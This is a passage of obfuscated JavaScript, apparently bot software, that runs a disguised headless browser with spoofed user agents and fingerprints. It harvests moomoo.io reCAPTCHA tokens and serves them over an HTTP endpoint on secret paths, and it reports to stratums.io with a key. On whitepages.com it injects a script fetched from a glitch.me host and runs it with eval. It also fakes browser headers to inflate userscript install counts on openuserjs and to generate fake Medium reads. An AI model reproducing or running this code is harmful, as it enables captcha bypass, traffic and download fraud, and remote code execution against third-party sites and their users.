    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + a2(0x2) + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x17)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a2(0x12)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a2(0xd) + 'pts/456856' + a2(0x8) + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + a2(0x14) + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + a0(0x18) + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + a0(0xe) + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + a0(0x4) + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2f1 + 0x20b3 + 0x8e9 * -0x4
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xafa + -0x1a61 + 0xf67)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x28f + 0x19d7 + -0x1c02), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xb7d * 0x3 + -0x2 * 0x93b + 0x3551), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0xf1a + -0x364 + -0xbb6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x3a * -0x9f + 0x47a * -0x2 + -0x2a * 0xa5; w < getRandomInt(0xd7d + -0x1 * -0x17b9 + 0x2535 * -0x1, -0x9ce + 0xfe3 + -0x610); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x8e9 * -0x1f + 0x2ed3 * 0x2 + 0x1a0f1);
        }
      }();
    }, 0x34 * -0x97 + -0x10e4 + 0x174 * 0x21), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2249 + 0x2 * -0xe59 + -0x1 * 0x597;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x993 * 0x2 + -0x269d + -0x97 * -0x21, 0xa2d + -0x1bb4 + -0x15d * -0xd)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3e7 * -0x6 + -0x9a69 + 0x12703 * 0x1);
    }, 0x1a4 * -0x4 + 0x24a + 0x4aa), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x4f * 0x4f + -0x1ff1 + 0x1 * 0x3852;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * -0x1047 + 0x156b + -0x19fa), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xf41 * -0x2 + -0x22f8 + 0x417a), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x14990c + -0x1 * -0x10037a + 0x1222 * -0x143);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x874 + -0xaf + -0x761);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x3 * -0x533 + 0x3 * 0x13f + 0xca4);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3 * -0xd3 + 0xc2f * -0x4 + 0x52c5);
}
doFlags['doOUJS'] && ((async () => {
  const bl = {
      f: 0x15
    },
    a6 = d,
    a5 = c,
    a4 = b;
  async function f() {
    const a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1130 + 0x13a + -0x1269) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x51c * 0x1 + 0xf * -0x3 + 0x2a5 * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x33d * 0x1 + 0x1fb * 0x13 + 0x1 * -0x28de, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3 * 0x15d + 0x7b5 + -0x39e, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x117e * 0x2 + -0x72 * 0x1d + 0x56f6),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + a3(0x13) + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1860 + -0x3740 + 0x45f0),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + a4(0x1, 'uRRV'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + a5(0xb),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + a6(bl.f) + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
